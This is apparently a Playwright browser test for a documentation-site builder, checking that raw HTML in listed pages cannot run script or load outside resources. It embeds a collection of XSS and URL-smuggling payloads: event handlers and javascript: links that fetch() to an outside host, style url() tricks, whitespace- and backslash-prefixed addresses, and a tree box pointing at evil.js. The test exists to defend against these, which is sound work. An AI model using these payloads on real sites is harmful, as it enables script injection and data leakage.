// Real-browser check that raw HTML in an automatically listed file runs no
// script and loads nothing from outside the bundle. The page holds the payloads
// of the three reviews of the earlier filter, B1 (the sidebar's tree box built
// from page content, which made nav.js load an outside script) and B2
// (addresses with a leading space, tab or newline). It is built, served over
// HTTP, and a second local listener stands in for the outside address: it must
// see no request, and no payload may run. A registered page, which is not
// filtered, holds the B1 box too, and a copy of the listed page gives the real
// sidebar box an outside address, so nav.js is checked on its own.
// LISTED_HTML_BROWSERS=chromium,firefox,webkit picks the engines; the default is chromium.
const playwright = require('../node_modules/playwright');
const {execFileSync} = require('node:child_process');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const assert = require('node:assert/strict');

const kit = path.resolve(__dirname, '..');
const python = process.env.DOCS_PYTHON || 'python3';
const engines = (process.env.LISTED_HTML_BROWSERS || 'chromium').split(',').map(name => name.trim()).filter(Boolean);
const types = {'.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml',
  '.png': 'image/png', '.woff2': 'font/woff2', '.json': 'application/json'};

function run(command, args, cwd) {
  const env = {...process.env};
  delete env.DOCSITE_PROJECT_ROOT;
  delete env.GITHUB_SHA;
  return execFileSync(command, args, {cwd, env, stdio: ['ignore', 'pipe', 'pipe']}).toString();
}

function listen(server) {
  return new Promise(resolve => server.listen(0, '127.0.0.1', () => resolve(server.address().port)));
}

function payloads(host) {
  const out = `http://${host}`;
  return `# Payloads

Review 1, event handlers, script links and loading attributes:

<p><img src="media/kept.png" alt="kept" onerror="fetch('${out}/r1-onerror')" onload="fetch('${out}/r1-onload')"></p>
<div onmouseover="fetch('${out}/r1-hover')">hover</div>
<details ontoggle="fetch('${out}/r1-toggle')" open><summary>s</summary>x</details>
<p><a href=javascript:fetch('${out}/r1-js')>bare script link</a> <a href="java&#x09;script:fetch('${out}/r1-tab')">tab</a></p>
<p><img src='${out}/r1-single.png' alt='single'></p>
<p><img src=${out}/r1-bare.png alt=bare></p>
<p><img srcset="${out}/r1-set.png 2x" src="media/kept.png" alt="set"></p>
<svg><image href="${out}/r1-svg.png"/></svg>
<p><image src="${out}/r1-image.png"></p>
<video poster='${out}/r1-poster.png'></video>

![protocol-relative](//${host}/r1-relative.png)

<p><a href="https://example.com/ok" ping="${out}/r1-ping">kept link</a></p>

Review 2, styles:

<p style="background:url('${out}/r2-style.png')">styled</p>
<div style="background:u\\72l(${out}/r2-escaped.png)">escaped</div>

Review 3, B1:

<div class="toc"><div class="repo-tree" data-repo-tree-src="${out}/evil.js" data-repo-tree-current="x"><details class="repo-tree-all"><summary>tree</summary></details></div></div>

Review 3, B2:

<video id="m5" poster=" //${host}/b2-poster"></video>
<img src=" //${host}/b2-space" alt="space">
<img src="/\t/${host}/b2-tab" alt="tab">
<img src="
//${host}/b2-newline" alt="newline">
<img src="&#9;//${host}/b2-entity" alt="entity">
<img src="\\\\${host}/b2-backslash" alt="backslash">
<img src="/\\${host}/b2-slash-backslash" alt="slash backslash">

An attempt to leave the content:

</div></div></main><b title="escape-marker">out</b>
`;
}

function gadget(host) {
  return `<div class="toc"><div class="repo-tree" data-repo-tree-src="http://${host}/registered.js" ` +
    `data-repo-tree-current="x"><details class="repo-tree-all"><summary>tree</summary></details></div></div>`;
}

function buildFixture(host) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'docs-kit-listed-html-'));
  run('git', ['init', '-q'], root);
  run(python, [path.join(kit, 'docsite.py'), 'init', root], kit);
  fs.mkdirSync(path.join(root, 'notes/media'), {recursive: true});
  fs.writeFileSync(path.join(root, 'notes/media/kept.png'), Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64'));
  fs.writeFileSync(path.join(root, 'notes/payloads.md'), payloads(host));
  fs.writeFileSync(path.join(root, 'notes/registered.md'), `# Registered\n\nA registered page is not filtered.\n\n${gadget(host)}\n`);
  const config = path.join(root, 'docs/site/site.toml');
  fs.appendFileSync(config, '\n[[source_pages]]\nsource = "notes/registered.md"\nslug = "registered"\n');
  run('git', ['add', '-A'], root);
  run(python, [path.join(kit, 'docsite.py'), 'build', '--project', root], kit);
  const html = path.join(root, '.build/docs/html');
  // The real sidebar box with an outside address: nav.js must refuse it too.
  const listed = fs.readFileSync(path.join(html, 'notes.payloads.md.html'), 'utf8');
  const box = '<div class="repo-tree" role="group"';
  assert.equal(listed.split(box).length, 2, 'the sidebar holds one tree box');
  fs.writeFileSync(path.join(html, 'tampered.html'), listed.replace(box,
    `${box} data-repo-tree-src="http://${host}/sidebar.js" data-repo-tree-current="notes.payloads.md.html"`));
  return root;
}

(async () => {
  const outside = [];
  const listener = http.createServer((request, response) => {
    outside.push(request.url);
    if (request.url.endsWith('.js')) {
      response.writeHead(200, {'content-type': 'text/javascript'});
      response.end(`window.__outsideScriptRan = (window.__outsideScriptRan || []).concat(${JSON.stringify(request.url)});`);
    } else {
      response.writeHead(404);
      response.end();
    }
  });
  const outsidePort = await listen(listener);
  const host = `127.0.0.1:${outsidePort}`;
  const root = buildFixture(host);
  const html = path.join(root, '.build/docs/html');
  const site = http.createServer((request, response) => {
    const file = path.join(html, decodeURIComponent(request.url.split('?')[0]));
    if (!file.startsWith(html + path.sep)) { response.writeHead(403); response.end(); return; }
    fs.readFile(file, (error, data) => {
      if (error) { response.writeHead(404); response.end(); return; }
      response.writeHead(200, {'content-type': types[path.extname(file)] || 'application/octet-stream'});
      response.end(data);
    });
  });
  const sitePort = await listen(site);
  const results = [];
  try {
    for (const engine of engines) {
      const browser = await playwright[engine].launch({headless: true});
      try {
        for (const name of ['notes.payloads.md.html', 'registered.html', 'tampered.html']) {
          outside.length = 0;
          const context = await browser.newContext({viewport: {width: 1280, height: 900}});
          const page = await context.newPage();
          page.setDefaultTimeout(10000);
          const dialogs = [], errors = [], requests = [];
          page.on('dialog', dialog => { dialogs.push(dialog.message()); dialog.dismiss(); });
          page.on('pageerror', error => errors.push(error.message));
          page.on('request', request => {
            if (!request.url().startsWith(`http://127.0.0.1:${sitePort}/`)) requests.push(request.url());
          });
          await page.goto(`http://127.0.0.1:${sitePort}/${name}`, {waitUntil: 'load'});
          // Give handlers a chance: hover and toggle what the page shows, then wait.
          for (const target of await page.locator('main.content div, main.content img, main.content summary').all()) {
            await target.hover({timeout: 1000}).catch(() => {});
          }
          for (const summary of await page.locator('main.content summary').all()) {
            await summary.click({timeout: 1000}).catch(() => {});
          }
          await page.waitForTimeout(1500);
          const facts = await page.evaluate(() => ({
            ran: window.__outsideScriptRan || [],
            treeReady: Boolean(document.querySelector('[data-repo-tree-ready]')),
            escaped: [...document.querySelectorAll('[title="escape-marker"]')].map(node => Boolean(node.closest('main.content'))),
            bodyChildren: [...document.body.children].map(node => node.tagName.toLowerCase() + (node.className ? '.' + node.className : '')),
            scriptsInContent: document.querySelectorAll('main.content script, main.content iframe, main.content svg, main.content video').length,
          }));
          assert.deepEqual(outside, [], `${engine} ${name}: the outside listener saw requests`);
          assert.deepEqual(requests, [], `${engine} ${name}: the page requested outside addresses`);
          assert.deepEqual(facts.ran, [], `${engine} ${name}: an outside script ran`);
          assert.deepEqual(dialogs, [], `${engine} ${name}: a dialog opened`);
          assert.deepEqual(errors, [], `${engine} ${name}: page errors`);
          assert.equal(facts.treeReady, false, `${engine} ${name}: nav.js placed a tree`);
          assert.deepEqual(new Set(facts.bodyChildren), new Set(['div.backdrop', 'div.layout', 'script']),
            `${engine} ${name}: content left the layout`);
          if (name !== 'registered.html') {
            assert.deepEqual(facts.escaped, [true], `${engine} ${name}: content left main`);
            assert.equal(facts.scriptsInContent, 0, `${engine} ${name}: loading elements in the content`);
          }
          results.push({engine, page: name, result: 'pass'});
          await context.close();
        }
      } finally {
        await browser.close();
      }
    }
  } finally {
    listener.close();
    site.close();
    fs.rmSync(root, {recursive: true, force: true});
  }
  console.log(JSON.stringify(results));
  console.log(`Listed raw HTML: in ${engines.join(', ')}, the three reviews' payloads, B1 and B2 load nothing from outside and run nothing; nav.js takes no tree box from page content or an outside address.`);
})().catch(error => { console.error(error); process.exit(1); });
